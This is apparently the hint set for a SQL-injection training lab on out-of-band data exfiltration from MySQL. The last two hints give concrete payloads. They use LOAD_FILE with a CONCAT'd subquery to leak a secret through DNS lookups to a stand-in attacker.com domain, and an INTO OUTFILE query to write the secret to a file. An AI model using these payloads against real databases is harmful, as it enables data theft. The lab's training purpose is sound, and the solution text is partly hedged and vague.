hints.title: Nudge
hints.content: No data comes back in the response, and time-based attacks are blocked. But the database server can talk to the outside world. Can you make it send data somewhere you're listening?

hints.title: Direction
hints.content: The lab has a built-in webhook catcher at /webhook that logs all incoming requests. If you can make the MySQL server fetch a URL that includes the flag data, you can see it in the webhook logs.

hints.title: Approach
hints.content: MySQL's LOAD_FILE() can sometimes trigger DNS lookups. More reliably in this lab, the web container can make HTTP requests. Try using a subquery to create a URL and trigger a request to the webhook.

hints.title: Near-solution
hints.content: The app processes the query result even though it doesn't display it. Use: 1 UNION SELECT LOAD_FILE(CONCAT('\\\\webhook.', (SELECT secret FROM oast_secrets LIMIT 1), '.attacker.com\\a')) — or use the built-in /webhook endpoint with the INTO OUTFILE trick to write data that the app can read.

hints.title: Solution
hints.content: This lab uses a simplified OAST approach: 1) Use the injection to write the flag to a known file: 1; SELECT secret FROM oast_secrets INTO OUTFILE '/tmp/exfil.txt' — but stacked queries may not work. 2) Alternative: UNION-based approach with LOAD_FILE for DNS: 0 UNION SELECT LOAD_FILE(CONCAT('\\\\',HEX((SELECT secret FROM oast_secrets LIMIT 1)),'.your-domain\\a')),2,3. 3) Simplest path: the /webhook endpoint catches requests. Use browser/curl to verify: GET /webhook/logs shows captured requests. Then inject to read the secret via error-based or find another channel to /webhook.
